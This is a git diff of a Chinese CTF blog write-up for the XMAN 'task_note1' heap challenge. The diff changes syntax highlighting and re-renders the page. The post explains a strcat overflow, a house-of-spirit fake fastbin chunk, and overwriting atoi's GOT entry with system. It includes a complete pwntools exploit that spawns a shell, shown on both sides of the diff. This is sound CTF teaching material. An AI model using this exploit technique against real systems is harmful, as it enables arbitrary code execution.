@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="xman夏令营 task_note1​    小伙伴扔给我这道题，看了下发现是个堆题。ida看了一下发现在edit函数中存在一个栈溢出，strcat的时候可以接0x90个字节，而dest空间只有0x80个字节，这里存在一个栈溢出，可以覆盖v7为任意值，但是其实很坑，程序内部有一个非常无耻的在字符串最后一个位置+’\x00’的操作，导致这里一直不能成功覆盖。后来看wp才知道strncat对不同偏移处">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -319,72 +319,9 @@
 <a id="more"></a>
 <p>​    但是这里有个坑就是fastbin malloc的话要注意chunk size，这里虽然free了bss段指针，但是由于chunk size为空，所以直接malloc肯定过不了检查，然后我们看到前面，程序最开头有一个bss段的写操作，看read的字节数发现是肯定能够写到bss段存储堆的地址头之前两个单元（16字节）的位置，将size赋值为fastbin所在字节的话就能成功malloc chunk了，这种操作好像是叫the house of spirit。<br>之后不出意外我们能够再bss段malloc一个chunk，然后由于是allocated chunk，我们能够改写fd和bk，这里将fd部分改写为atoi的got表地址，之后我们利用show函数泄露atoi真实地址，然后利用libc searcher查找到远端服务器所用libc版本。<br>​    做完这一切后利用edit函数中自带的strcpy函数覆写atoi为system，之后直接构造输入为/bin/sh就行了。之后就能get shell。</p>
 <p>exp如下:</p>
-<pre><code>from pwn import *
-
-p=process(&#39;./note&#39;)
-libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
-
-def newnote(length,x):
-    p.recvuntil(&#39;---&gt;&gt;&#39;)
-    p.sendline(&#39;1&#39;)
-    p.recvuntil(&#39;:&#39;)
-    p.sendline(str(length))
-    p.recvuntil(&#39;:&#39;)
-    p.sendline(x)
-
-def editnote_append(id,x):
-    p.recvuntil(&#39;---&gt;&gt;&#39;)
-    p.sendline(&#39;3&#39;)
-    p.recvuntil(&#39;id&#39;)
-    p.sendline(str(id))
-    p.recvuntil(&#39;append&#39;)
-    p.sendline(&#39;2&#39;)
-    p.recvuntil(&#39;:&#39;)
-    p.sendline(x)
-
-def editnote_overwrite(id,x):
-    p.recvuntil(&#39;---&gt;&gt;&#39;)
-    p.sendline(&#39;3&#39;)
-    p.recvuntil(&#39;id&#39;)
-    p.sendline(str(id))
-    p.recvuntil(&#39;append&#39;)
-    p.sendline(&#39;1&#39;)
-    p.recvuntil(&#39;:&#39;)
-    p.sendline(x)
-
-def shownote(id):
-    p.recvuntil(&#39;---&gt;&gt;&#39;)
-    p.sendline(&#39;2&#39;)
-    p.recvuntil(&#39;id&#39;)
-    p.sendline(str(id))
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./note'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(length,x)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote_append</span><span class="params">(id,x)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(<span class="string">'append'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote_overwrite</span><span class="params">(id,x)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(<span class="string">'append'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x70</span>))</span><br><span class="line">p.recvuntil(<span class="string">'address:'</span>)</span><br><span class="line">p.sendline(p64(<span class="number">0</span>)+p64(<span class="number">0x70</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">newnote(<span class="number">128</span>,<span class="number">94</span>*<span class="string">'a'</span>)</span><br><span class="line">editnote_append(<span class="number">0</span>,<span class="string">'b'</span>*<span class="number">34</span>+p64(<span class="number">0x602120</span>))<span class="comment">#ptr_addr</span></span><br><span class="line"></span><br><span class="line">atoi_got = <span class="number">0x602088</span></span><br><span class="line">newnote(<span class="number">0x60</span>,p64(atoi_got))</span><br><span class="line"></span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'is '</span>)</span><br><span class="line">atoi_addr = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">atoi_libc=libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">sys_libc=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system=atoi_addr-atoi_libc+sys_libc</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system="</span>+hex(system)</span><br><span class="line"></span><br><span class="line">editnote_overwrite(<span class="number">0</span>,p64(system)) <span class="comment">#got written</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'---&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
-p.recvuntil(&#39;name:&#39;)
-p.send(&#39;a&#39;*0x30+p64(0)+p64(0x70))
-p.recvuntil(&#39;address:&#39;)
-p.sendline(p64(0)+p64(0x70))
-#gdb.attach(p)
-
-newnote(128,94*&#39;a&#39;)
-editnote_append(0,&#39;b&#39;*34+p64(0x602120))#ptr_addr
-
-atoi_got = 0x602088
-newnote(0x60,p64(atoi_got))
-
-shownote(0)
-p.recvuntil(&#39;is &#39;)
-atoi_addr = u64(p.recvline().strip(&#39;\n&#39;).ljust(8, &#39;\x00&#39;))
-atoi_libc=libc.symbols[&#39;atoi&#39;]
-sys_libc=libc.symbols[&#39;system&#39;]
-system=atoi_addr-atoi_libc+sys_libc
-print &quot;system=&quot;+hex(system)
-
-editnote_overwrite(0,p64(system)) #got written
-#gdb.attach(p)
-p.recvuntil(&#39;---&gt;&gt;&#39;)
-p.sendline(&#39;/bin/sh&#39;)
-p.interactive()
-</code></pre>
     </div>
 
     
@@ -489,8 +426,6 @@ p.interactive()
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
